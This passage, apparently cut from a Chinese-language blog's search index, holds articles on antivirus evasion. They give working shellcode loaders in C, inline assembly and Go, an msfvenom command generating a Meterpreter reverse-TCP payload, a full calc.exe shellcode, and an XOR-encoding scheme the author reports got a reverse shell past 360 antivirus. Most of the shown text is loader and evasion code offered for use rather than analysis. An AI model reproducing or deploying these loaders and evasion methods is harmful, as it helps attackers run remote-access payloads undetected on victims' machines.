<p>\u63a5\u6536\u4ee5\u540e\uff0c\u5c31\u9700\u8981\u4e0d\u65ad\u63a5\u6536\u4e0d\u65ad\u8bfb\u53d6\uff0c\u7136\u540ereturn\u7684\u65b9\u5f0f\u76f4\u63a5\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u6267\u884c</p> <p></p> <p>\u6b64\u65f6\u5982\u679c\u5728ret\u51fa\u6253\u65ad\u70b9\uff0c\u4e5f\u53ef\u4ee5\u770b\u5230meterpreter\u7684\u4ee3\u7801</p> <p>\u4ee5\u4e0a\u662fmsf\u7684shellcode\u529f\u80fd\u5b9e\u73b0\u5256\u6790\uff0c\u56e0\u4e3amsf\u7684\u88f8\u9a6c\u5f88\u5bb9\u6613\u88ab\u6740\uff0c\u6240\u4ee5\u53ef\u4ee5\u53c2\u7167\u4e0a\u9762\u7684\u8fc7\u7a0b\u7528C++\u81ea\u884c\u7f16\u5199\uff0c\u4e00\u6837\u53ef\u4ee5\u8fbe\u5230\u514d\u6740\u7684\u76ee\u7684\uff08\u4ee3\u7801\u5c31\u4e0d\u6cbe\u4e86\uff0c\u8bd5\u4e86\u8bd5\u53ef\u4ee5\u8fc7\u706b\u7ed2\uff09</p> <p>\u8fd9\u4e00\u7ae0\u5b66\u4e60\u4e86\u4e00\u4e9b\u57fa\u672c\u7684\u77e5\u8bc6\uff0c\u4e5f\u5b66\u5230\u4e86\u4e00\u79cd\u9759\u6001\u514d\u6740\u7684\u65b9\u6cd5\uff0c\u901a\u8fc7\u4fee\u6539hash\u503c\u7684\u65b9\u5f0f\uff0c\u611f\u5174\u8da3\u7684\u5e08\u5085\u53ef\u4ee5\u7814\u7a76\u4e0b\uff0c\u8fd9\u91cc\u4e0d\u505a\u8d58\u8ff0\u4e86\uff0c\u6211\u81ea\u5df1\u5c1d\u8bd5\u4e86\u4e0b\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u7136\u540e\u4e8c\u5206\u6cd5\u5b9a\u4f4d\u88ab\u67e5\u6740\u6bb5\u518d\u7ed3\u5408\u82b1\u6307\u4ee4\u662f\u53ef\u4ee5\u7ed5\u8fc7\u6740\u8f6f\u68c0\u6d4b\u7684</p> <p>https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection</p> <p>\u5de5\u5177\uff1a</p> <p>https://github.com/embee-research/APIHashReplace</p>"},{"location":"CTF/Antimalware_evasion/Article2/index.html","title":"C/C++\u52a0\u8f7dshellcode","text":"<p>\u6e90\u7801+shellcode\u76f4\u63a5\u7f16\u8bd1\uff1a\u51fd\u6570\u6307\u9488\u6267\u884c\uff0c\u5185\u8054\u6c47\u7f16\u52a0\u8f7d\uff0c\u7533\u8bf7\u52a8\u6001\u5185\u5b58</p> <p>\u4f7f\u7528\u52a0\u8f7d\u5668\u52a0\u8f7dshellcode</p>"},{"location":"CTF/Antimalware_evasion/Article2/index.html#_1","title":"\u51fd\u6570\u6307\u9488\u6267\u884c","text":"<pre><code>#include &lt;stdio.h&gt;\n#include&lt;windows.h&gt;\n# pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n//\u8bbe\u7f6e\u5165\u53e3\u5730\u5740\uff0c\u4e0d\u5f39\u51fa\u9ed1\u7a97\u53e3\nunsigned char buf[] =\n\"shellcode\";\n\nvoid main()\n{\n    ((void(*)(void)) &amp; buf)(); //\u8fd9\u662f\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u8c03\u7528\uff0c\u5c06buf\u6570\u7ec4\u7684\u5730\u5740\u5f3a\u5236\u8f6c\u6362\u4e3a\u4e00\u4e2a\u65e0\u53c2\u7684\u51fd\u6570\u6307\u9488\uff0c\u7136\u540e\u8c03\u7528\u8be5\u51fd\u6570\u3002\u8fd9\u4e2a\u64cd\u4f5c\u4f1a\u6267\u884cbuf\u4e2d\u5b58\u50a8\u7684Shellcode\u3002\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/Article2/index.html#_2","title":"\u7533\u8bf7\u52a8\u6001\u5185\u5b58\u52a0\u8f7d","text":"<pre><code>#include &lt;windows.h&gt;\n\n// \u5b9a\u4e49Shellcode\nunsigned char buf[] = \"shellcode\";\n\nint main()\n{\n    PVOID Memory;\n    // \u52a8\u6001\u5206\u914d\u865a\u62df\u5730\u5740\u7a7a\u95f4\n    Memory = VirtualAlloc(\n        NULL,                           // \u8ba9\u7cfb\u7edf\u9009\u62e9\u5185\u5b58\u57fa\u5740\n        sizeof(buf),                    // \u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\n        MEM_COMMIT | MEM_RESERVE,       // \u63d0\u4ea4\u5e76\u4fdd\u7559\u5185\u5b58\n        PAGE_EXECUTE_READWRITE          // \u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\n    );\n\n    // \u590d\u5236\u5185\u5b58\u5185\u5bb9\uff0c\u5c06Shellcode\u590d\u5236\u5230\u65b0\u5206\u914d\u7684\u5185\u5b58\u4e2d\n    memcpy(Memory, buf, sizeof(buf));\n\n    // \u6267\u884cShellcode\uff0c\u5c06\u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u8f6c\u6362\u4e3a\u51fd\u6570\u6307\u9488\u5e76\u8c03\u7528\n    ((void(*)())Memory)();\n}\n</code></pre> <p>\u4ee3\u7801\u89e3\u91ca\uff1a</p> <p>1.\u5b9a\u4e49Shellcode:</p> <ul> <li><code>unsigned char buf[] = \"shellcode\";</code>: \u58f0\u660e\u4e00\u4e2a\u5b57\u7b26\u6570\u7ec4buf\uff0c\u7528\u4e8e\u5b58\u50a8Shellcode\u3002\u5b9e\u9645\u7684Shellcode\u5e94\u8be5\u7528\u5bf9\u5e94\u7684\u5341\u516d\u8fdb\u5236\u6570\u503c\u66ff\u4ee3\"shellcode\"\u3002</li> </ul> <p>2.\u5206\u914d\u5185\u5b58:</p> <ul> <li> <p><code>PVOID Memory;</code>: \u58f0\u660e\u4e00\u4e2a\u6307\u5411\u4efb\u4f55\u7c7b\u578b\u7684\u6307\u9488Memory\uff0c\u7528\u4e8e\u5b58\u50a8\u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u3002</p> </li> <li> <p><code>Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</code>: \u8c03\u7528VirtualAlloc\u51fd\u6570\u5206\u914d\u865a\u62df\u5185\u5b58\uff1a   <pre><code>NULL: \u8ba9\u7cfb\u7edf\u9009\u62e9\u5185\u5b58\u7684\u57fa\u5740\u3002\n</code></pre> <pre><code>sizeof(buf): \u9700\u8981\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\uff0c\u4e0eShellcode\u7684\u5927\u5c0f\u76f8\u540c\u3002\n</code></pre> <pre><code>MEM_COMMIT | MEM_RESERVE: \u63d0\u4ea4\u5e76\u4fdd\u7559\u5185\u5b58\u3002\n</code></pre> <pre><code>PAGE_EXECUTE_READWRITE: \u5206\u914d\u7684\u5185\u5b58\u9875\u5c5e\u6027\u4e3a\u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\u3002\n</code></pre></p> </li> </ul> <p>3.\u590d\u5236\u5185\u5b58\u5185\u5bb9:</p> <ul> <li><code>memcpy(Memory, buf, sizeof(buf));</code>: \u5c06Shellcode\u4ecebuf\u590d\u5236\u5230\u5206\u914d\u7684\u5185\u5b58\u4e2d\u3002</li> </ul> <p>4.\u6267\u884cShellcode:</p> <ul> <li><code>((void(*)())Memory)();</code>: \u5c06\u5206\u914d\u7684\u5185\u5b58\u5730\u5740Memory\u8f6c\u6362\u4e3a\u4e00\u4e2a\u65e0\u53c2\u7684\u51fd\u6570\u6307\u9488\uff0c\u5e76\u8c03\u7528\u8be5\u51fd\u6570\u3002\u8fd9\u4e2a\u64cd\u4f5c\u4f1a\u6267\u884cMemory\u4e2d\u5b58\u50a8\u7684Shellcode\u3002</li> </ul>"},{"location":"CTF/Antimalware_evasion/Article2/index.html#_3","title":"\u5185\u8054\u6c47\u7f16\u52a0\u8f7d","text":"<pre><code>#include &lt;windows.h&gt;  \n#include &lt;stdio.h&gt;  \n//\u5c06.data\u6bb5\u8bbe\u7f6e\u4e3a\u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c.\u9ed8\u8ba4\u60c5\u51b5\u4e0b,\u6570\u636e\u6bb5\u662f\u4e0d\u53ef\u6267\u884c\u7684,\u8fd9\u91cc\u901a\u8fc7\u94fe\u63a5\u5668\u6307\u4ee4\u4fee\u6539\u5176\u5c5e\u6027.\n#pragma comment(linker, \"/section:.data,RWE\")  \nunsigned char shellcode[] = \"shellcode\";\nvoid main()\n{\n    __asm\n    {\n        mov eax, offset shellcode //\u5c06shellcode\u6570\u7ec4\u7684\u5730\u5740\uff08\u504f\u79fb\u91cf\uff09\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668eax\u4e2d\u3002\n        jmp eax  //\u8df3\u8f6c\u5230\u5bc4\u5b58\u5668eax\u4e2d\u5b58\u50a8\u7684\u5730\u5740,\u5373\u8df3\u8f6c\u5230shellcode\u7684\u8d77\u59cb\u5730\u5740\uff0c\u5f00\u59cb\u6267\u884cShellcode.\n    }\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/Article2/index.html#goshellcode","title":"Go\u8bed\u8a00\u52a0\u8f7dshellcode","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"syscall\"\n    \"unsafe\"\n)\n// \u5b9a\u4e49\u5185\u5b58\u5206\u914d\u548c\u9875\u9762\u5c5e\u6027\u5e38\u91cf\nconst (\n    MEM_COMMIT             = 0x1000\n    MEM_RESERVE            = 0x2000\n    PAGE_EXECUTE_READWRITE = 0x40\n)\n// \u52a0\u8f7dDLL\u548c\u67e5\u627e\u51fd\u6570\nvar (\n    kernel32      = syscall.MustLoadDLL(\"kernel32.dll\")\n    ntdll         = syscall.MustLoadDLL(\"ntdll.dll\")\n    VirtualAlloc  = kernel32.MustFindProc(\"VirtualAlloc\")\n    RtlCopyMemory = ntdll.MustFindProc(\"RtlCopyMemory\")\n    shellcode_buf = []byte{\n      // Shellcode\u7684\u524d\u90e8\u5206\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\n        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,\n        0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x51, 0x48, 0x8b,\n        0x52, 0x20, 0x56, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,\n        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, \n    }\n)\n// \u9519\u8bef\u68c0\u67e5\u51fd\u6570\nfunc checkErr(err error) {\n    if err != nil {\n        if err.Error() != \"The operation completed successfully.\" {\n            println(err.Error())\n            os.Exit(1)\n        }\n    }\n}\n\nfunc main() {\n    shellcode := shellcode_buf  // Shellcode\u6570\u636e\n    // \u8c03\u7528VirtualAlloc\u51fd\u6570\u5206\u914d\u5185\u5b58\n    addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)\n    if err != nil &amp;&amp; err.Error() != \"The operation completed successfully.\" {\n        syscall.Exit(0)\n    }\n    fmt.Println(\"\u5185\u5b58\u5206\u914d\u6210\u529f\")\n    // \u8c03\u7528RtlCopyMemory\u51fd\u6570\u590d\u5236\u5185\u5b58\n    _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))\n    if err != nil &amp;&amp; err.Error() != \"The operation completed successfully.\" {\n        syscall.Exit(0)\n    }\n    fmt.Println(\"\u5185\u5b58\u590d\u5236\u6210\u529f\")\n    // \u8c03\u7528\u5206\u914d\u5185\u5b58\u5730\u5740\u5904\u7684Shellcode\n    syscall.Syscall(addr, 0, 0, 0, 0)\n}\n</code></pre> <p>\u4ee3\u7801\u89e3\u91ca:</p> <p>1.\u5bfc\u5165\u5305\uff1a</p> <ul> <li> <p>fmt: \u63d0\u4f9b\u683c\u5f0f\u5316I/O\u529f\u80fd\u3002</p> </li> <li> <p>os: \u63d0\u4f9b\u5e73\u53f0\u65e0\u5173\u7684\u64cd\u4f5c\u7cfb\u7edf\u529f\u80fd\u3002</p> </li> <li> <p>syscall: \u63d0\u4f9b\u4f4e\u7ea7\u522b\u7684\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u3002</p> </li> <li> <p>unsafe: \u63d0\u4f9bGo\u8bed\u8a00\u4e2d\u4e0d\u5b89\u5168\u7684\u5185\u5b58\u64cd\u4f5c\u3002</p> </li> </ul> <p>2.\u5e38\u91cf\u5b9a\u4e49:</p> <ul> <li>MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE: \u5185\u5b58\u5206\u914d\u548c\u9875\u9762\u5c5e\u6027\u5e38\u91cf\uff0c\u7528\u4e8e\u8c03\u7528VirtualAlloc\u51fd\u6570\u3002</li> </ul> <p>3.\u52a0\u8f7dDLL\u548c\u51fd\u6570:</p> <ul> <li> <p>\u4f7f\u7528syscall.MustLoadDLL\u52a0\u8f7dkernel32.dll\u548cntdll.dll\u3002</p> </li> <li> <p>\u4f7f\u7528kernel32.MustFindProc(\"VirtualAlloc\")\u67e5\u627eVirtualAlloc\u51fd\u6570\u3002</p> </li> <li> <p>\u4f7f\u7528ntdll.MustFindProc(\"RtlCopyMemory\")\u67e5\u627eRtlCopyMemory\u51fd\u6570\u3002</p> </li> </ul> <p>4.\u5b9a\u4e49Shellcode:</p> <ul> <li>shellcode_buf\u5b58\u50a8\u4e86Shellcode\u7684\u5b57\u8282\u7801\u3002</li> </ul> <p>5.\u9519\u8bef\u68c0\u67e5\u51fd\u6570:</p> <ul> <li>checkErr\u51fd\u6570\u7528\u4e8e\u68c0\u67e5\u9519\u8bef\u5e76\u5728\u9519\u8bef\u53d1\u751f\u65f6\u9000\u51fa\u7a0b\u5e8f\u3002</li> </ul> <p>6.\u4e3b\u51fd\u6570main:</p> <ul> <li> <p>\u8c03\u7528VirtualAlloc\u51fd\u6570\u5206\u914d\u53ef\u6267\u884c\u3001\u53ef\u8bfb\u3001\u53ef\u5199\u7684\u5185\u5b58\u3002</p> </li> <li> <p>\u8c03\u7528RtlCopyMemory\u51fd\u6570\u5c06Shellcode\u590d\u5236\u5230\u5206\u914d\u7684\u5185\u5b58\u4e2d\u3002</p> </li> <li> <p>\u8c03\u7528\u5206\u914d\u5185\u5b58\u5730\u5740\u5904\u7684Shellcode\uff0c\u5f00\u59cb\u6267\u884cShellcode\u3002</p> </li> </ul> <p>\u4f7f\u7528go\u52a0\u8f7dshellcode\u6709\u4e24\u4e2a\u95ee\u9898\u9700\u8981\u6ce8\u610f\uff0c\u4e00\u662fshellcode\u8981\u751f\u6210x64\u67b6\u6784\u7684\uff0c\u4e8c\u662fshellcode\u9700\u8981\u751f\u6210num\u683c\u5f0f.</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=xxxxxxx lport=xxxx -a x64 -f num\n</code></pre>"},{"location":"CTF/Antimalware_evasion/Article2/index.html#shellcode","title":"shellcode\u53d8\u5f62\u514d\u6740\u521d\u63a2","text":"<p>shellcode\u7684\u672c\u8d28\u662f\u8ba1\u7b97\u673a\u53ef\u76f4\u63a5\u6267\u884c\u7684\u673a\u5668\u7801\uff0c\u6bd4\u6c47\u7f16\u8bed\u8a00\u66f4\u4f4e\u4e00\u5c42\u7684\u5b58\u5728\uff0c\u5bf9\u4e8emsf\u751f\u6210\u7684\u4e00\u6bb5\u5f39\u51facalc.exe\u7684shellcode\uff0c\u7ffb\u8bd1\u6210\u6c47\u7f16\u8bed\u8a00\u5982\u4e0b\u6240\u793a</p> <pre><code>00446000 | FC               | cld                                   |\n00446001 | E8 82000000      | call shellcodeanalyse.446088          |\n00446006 | 60               | pushad                                |\n00446007 | 89E5             | mov ebp,esp                           | upper stack\n00446009 | 31C0             | xor eax,eax                           | eax:unsigned char * buf\n0044600B | 64:8B50 30       | mov edx,dword ptr fs:[eax+30]         | PEB\n0044600F | 8B52 0C          | mov edx,dword ptr ds:[edx+C]          | DllList\n00446012 | 8B52 14          | mov edx,dword ptr ds:[edx+14]         | InMemoryOrderModuleList\n00446015 | 8B72 28          | mov esi,dword ptr ds:[edx+28]         | Full_DLLNAME_Buffer\n00446018 | 0FB74A 26        | movzx ecx,word ptr ds:[edx+26]        | MaximumLength\n0044601C | 31FF             | xor edi,edi                           | edi:___argv\n0044601E | AC               | lodsb                                 |\n0044601F | 3C 61            | cmp al,61                             | upper(ch)\n00446021 | 7C 02            | jl shellcodeanalyse.446025            |\n00446023 | 2C 20            | sub al,20                             |\n00446025 | C1CF 0D          | ror edi,D                             | (rotate)res&gt;&gt; 0xD\n00446028 | 01C7             | add edi,eax                           | edi:___argv, eax:unsigned char * buf\n0044602A | E2 F2            | loop shellcodeanalyse.44601E          |\n0044602C | 52               | push edx                              | edi:hash of(dll name)\n0044602D | 57               | push edi                              | edi:___argv\n0044602E | 8B52 10          | mov edx,dword ptr ds:[edx+10]         | dllbase\n00446031 | 8B4A 3C          | mov ecx,dword ptr ds:[edx+3C]         | nt_headers\n00446034 | 8B4C11 78        | mov ecx,dword ptr ds:[ecx+edx+78]     | export_entry\n00446038 | E3 48            | jecxz shellcodeanalyse.446082         | jump if ecx==0 judge if export\n</code></pre> <p>\u539fshellcode\uff1a</p> <pre><code>unsigned char buf[] =\n\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n\"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\"\n\"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\"\n\"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\"\n\"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\"\n\"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\"\n\"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\"\n\"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\"\n\"\\x8d\\x5d\\x6a\\x01\\x8d\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\"\n\"\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\"\n\"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\"\n\"\\x00\\x53\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n</code></pre> <p>\u7ed3\u5408\u4e00\u6bb5\u5f39\u51facalc\u7684shellcode\u8fdb\u884c\u8bd5\u9a8c:</p> <p></p> <p>\u6709\u7a0b\u5e8f\u7684\u8f93\u51fa\u53ef\u77e5\uff0cshellcode\u7684\u957f\u5ea6\u4e3a194\u5b57\u8282\uff0c\\x\u610f\u5473\u7740\u540e\u9762\u662f16\u8fdb\u5236\u3002\u6240\u4ee5shellcode\u5c31\u662f\u4e00\u6bb5194\u5b57\u8282\u957f\u768416\u8fdb\u5236\u6570\u636e\u3002\u7531\u4e8eshellcode\u662f16\u8fdb\u5236\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\u7684\u7f18\u6545\uff0c\u7528\u5e38\u89c4\u7684\u52a0\u5bc6\u601d\u8def\u53bb\u5904\u7406\u663e\u5f97\u5f88\u56f0\u96be\u3002</p> <p>\u5728\u8fd9\u91cc\u6211\u4f7f\u7528\u5f02\u6216\u7684\u65b9\u6cd5\u5904\u7406shellcode\uff0c\u5f02\u6216\u7684\u7279\u70b9\u662f\u539f\u6570\u636e\u7ecf\u8fc7\u4e24\u6b21\u5f02\u6216\u540e\u4e0e\u539f\u6765\u76f8\u540c\uff0c\u672c\u4f8b\u4e2d\u6700\u7ec8\u7684buf\u7ecf\u8fc7\u51fd\u6570\u6307\u9488\u6267\u884c\u662f\u53ef\u4ee5\u6b63\u5e38\u542f\u52a8calc.exe\u7684\u3002\u5c06\u7b2c\u4e00\u6b21\u5f02\u6216\u540e\u5bc6\u6587\u4fdd\u5b58\uff0c\u4f7f\u7528\u65f6\u5728\u4ee3\u7801\u4e2d\u89e3\u5bc6\uff0c\u5c31\u662f\u53d8\u5f62\u514d\u6740\u7684\u521d\u6b65\u601d\u60f3\u3002</p> <p></p> <pre><code>#include &lt;stdio.h&gt;\n\n// \u4e3b\u51fd\u6570\nvoid main() {\n    // \u5b9a\u4e49Shellcode\u7684\u5b57\u8282\u6570\u7ec4\n    unsigned char buf[] = \"\\xf6\\xe2\\x88\\xa\\xa\\xa\\x6a\\x83\\xef\\x3b\\xca\\x6e\\x81\\x5a\\x3a\\x81\\x58\\x6\\x81\\x58\\x1e\\x81\\x78\\x22\\x5\\xbd\\x40\\x2c\\x3b\\xf5\\xa6\\x36\\x6b\\x76\\x8\\x26\\x2a\\xcb\\xc5\\x7\\xb\\xcd\\xe8\\xf8\\x58\\x5d\\x81\\x58\\x1a\\x81\\x40\\x36\\x81\\x46\\x1b\\x72\\xe9\\x42\\xb\\xdb\\x5b\\x81\\x53\\x2a\\xb\\xd9\\x81\\x43\\x12\\xe9\\x30\\x43\\x81\\x3e\\x81\\xb\\xdc\\x3b\\xf5\\xa6\\xcb\\xc5\\x7\\xb\\xcd\\x32\\xea\\x7f\\xfc\\x9\\x77\\xf2\\x31\\x77\\x2e\\x7f\\xee\\x52\\x81\\x52\\x2e\\xb\\xd9\\x6c\\x81\\x6\\x41\\x81\\x52\\x16\\xb\\xd9\\x81\\xe\\x81\\xb\\xda\\x83\\x4e\\x2e\\x2e\\x51\\x51\\x6b\\x53\\x50\\x5b\\xf5\\xea\\x55\\x55\\x50\\x81\\x18\\xe1\\x87\\x57\\x60\\xb\\x87\\x8f\\xb8\\xa\\xa\\xa\\x5a\\x62\\x3b\\x81\\x65\\x8d\\xf5\\xdf\\xb1\\xfa\\xbf\\xa8\\x5c\\x62\\xac\\x9f\\xb7\\x97\\xf5\\xdf\\x36\\xc\\x76\\x0\\x8a\\xf1\\xea\\x7f\\xf\\xb1\\x4d\\x19\\x78\\x65\\x60\\xa\\x59\\xf5\\xdf\\x69\\x6b\\x66\\x69\\x24\\x6f\\x72\\x6f\\xa\\xa\";\n\n    // \u83b7\u53d6Shellcode\u7684\u5927\u5c0f\n    int shellcodesize = sizeof(buf);\n\n    // \u6253\u5370Shellcode\u7684\u5927\u5c0f\n    printf(\"%d\\n\", shellcodesize);\n\n    // \u904d\u5386Shellcode\u7684\u6bcf\u4e00\u4e2a\u5b57\u8282\n    for (int i = 0; i &lt; shellcodesize; i++) {\n        // \u901a\u8fc7XOR\u64cd\u4f5c\u8fdb\u884c\u89e3\u7801\uff0cXOR\u7684\u5bc6\u94a5\u4e3a10\n        buf[i] ^= 10;\n    }\n\n    // \u6267\u884c\u89e3\u7801\u540e\u7684Shellcode\n    ((void(*)(void)) &amp;buf)();\n}\n</code></pre> <p>\u5c06shellcode\u6362\u6210\u53cd\u5f39shell\u518d\u6b21\u8fdb\u884c\u8bd5\u9a8c\uff0c360\u52a8\u6001\u9759\u6001\u5168\u90e8\u514d\u6740\u6b63\u5e38\u4e0a\u7ebf\u3002\u4f46\u662f\u5f53360\u5f00\u542f\u9cb2\u9e4f\u5f15\u64ce\u65f6\u52a8\u9759\u90fd\u88ab\u67e5\u6740\u3002</p> <p></p> <p>windows defender\u76f4\u63a5\u67e5\u6740</p> <p></p> <p>\u4ecevt\u67e5\u6740\u7387\u6765\u770b\uff0c\u6548\u679c\u8fd8\u6709\u5f85\u63d0\u9ad8\uff0c\u4e0d\u8fc7\u76f8\u6bd4\u672a\u4f5c\u5904\u7406\u5df2\u6709\u5f88\u5927\u6539\u5584\u3002</p> <p></p>"},{"location":"CTF/Antimalware_evasion/Article3/index.html","title":"Windows\u5e73\u53f0\u4e0b\u7684\u5185\u5b58\u7ba1\u7406","text":""},{"location":"CTF/Antimalware_evasion/Article3/index.html#1windows","title":"1.Windows\u5e73\u53f0\u4e0b\u4e3b\u8981\u7684\u5185\u5b58\u7ba1\u7406\u9014\u5f84","text":""},{"location":"CTF/Antimalware_evasion/Article3/index.html#2","title":"2.\u8c03\u7528\u5173\u7cfb","text":"<p>\u7b2c\u4e00\u5c42\uff1aWin32 API\u4f5c\u4e3a\u7cfb\u7edf\u7684\u63a5\u53e3\uff0c\u63d0\u4f9b\u4e86\u4e00\u7ec4\u64cd\u4f5c\u865a\u62df\u5185\u5b58\u7684\u63a5\u53e3\uff1b</p> <p>\u7b2c\u4e8c\u5c42\uff1aHeap\u4f5c\u4e3a\u865a\u62df\u5185\u5b58\u7684\u4e00\u90e8\u5206\uff0cWin32 API\u53c8\u63d0\u4f9b\u4e86\u4e00\u7ec4\u64cd\u4f5cHeap\u5185\u5b58\u7684\u63a5\u53e3\uff0c\u4f46\u662f\u8fd9\u4e9b\u63a5\u53e3\u662f\u5efa\u7acb\u5728\u64cd\u4f5c\u865a\u62df\u5185\u5b58\u7684\u63a5\u53e3\u7684\u57fa\u7840\u4e0a\u3002</p> <p>\u7b2c\u4e09\u5c42\uff1aWindows\u5e73\u53f0\u4e0b\u7684C Run-Time Library \u53c8\u5229\u7528Heap API\u6765\u5b9e\u73b0malloc\u548cfree\u3002</p> <p>\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e9b\u52a8\u6001\u5185\u5b58\u64cd\u4f5c\u65b9\u5f0f\u4e4b\u95f4\u5b58\u6709\u5355\u4e00\u7684\u5c42\u6b21\u5173\u7cfb\uff0c\u4f4d\u4e8e\u8fd9\u4e2a\u5c42\u6b21\u7684\u6700\u4f4e\u5c42\u7684\u662fVirtual Memory API\uff0c\u53ef\u4ee5\u8bf4\u8fd9\u4e9b\u65b9\u5f0f\u90fd\u662f\u5efa\u7acb\u5728Virtual Memory API\u7684\u57fa\u7840\u4e0a\u3002</p> <p>\u8c03\u7528\u5173\u7cfb\u5982\u4e0b\u8868\u6240\u793a\u4e3a : new -&gt; malloc -&gt; HeapAlloc -&gt; VirtualAlloc -&gt; \u9a71\u52a8\u7a0b\u5e8f\u7684_PageAlloc</p>"},{"location":"CTF/Antimalware_evasion/Article3/index.html#windows_1","title":"Windows\u5185\u5b58\u64cd\u4f5c","text":"<p>Windows\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u5b58\u6709\u4e09\u79cd\u5c5e\u6027\uff0c\u5206\u522b\u4e3a\uff1a\u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\uff0c\u5e76\u4e14\u64cd\u4f5c\u7cfb\u7edf\u5c06\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u90fd\u9694\u79bb\u5f00\u6765\uff0c\u5f53\u8fdb\u7a0b\u8fd0\u884c\u65f6\uff0c\u521b\u5efa\u4e00\u4e2a\u865a\u62df\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u7cfb\u7edf\u7684\u5185\u5b58\u7ba1\u7406\u5668\u5c06\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\u4e0a\uff0c\u6240\u4ee5\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u90fd\u662f\u7b49\u5927\u7684\u3002</p> <p>\u5728\u8fdb\u7a0b\u7533\u8bf7\u65f6\uff0c\u9700\u8981\u58f0\u660e\u8fd9\u5757\u5185\u5b58\u7684\u57fa\u672c\u4fe1\u606f\uff1a\u7533\u8bf7\u5185\u5b58\u5927\u5c0f\u3001\u7533\u8bf7\u5185\u5b58\u8d77\u59cb\u5185\u5b58\u57fa\u5740\u3001\u7533\u8bf7\u5185\u5b58\u5c5e\u6027\u3001\u7533\u8bf7\u5185\u5b58\u5bf9\u5916\u7684\u6743\u9650\u7b49\u3002</p> <p>\u7533\u8bf7\u65b9\u5f0f\uff1a</p> <ul> <li>HeapAlloc</li> <li>malloc</li> <li>VirtualAlloc</li> <li>new</li> <li>LocalAlloc</li> </ul> <p>\u5176\u5b9e\u4ee5\u4e0a\u6240\u6709\u7684\u5185\u5b58\u7533\u8bf7\u65b9\u5f0f\u90fd\u4e0eVirtualAlloc\u6709\u5173\uff0c\u56e0\u4e3aVirtualAlloc\u7533\u8bf7\u7684\u5355\u4f4d\u662f\u201c\u9875\u201d\u3002\u800cWindows\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u5185\u5b58\u7684\u5355\u4f4d\u4e5f\u662f\u201c\u9875\u201d\u3002</p> <pre><code>#include 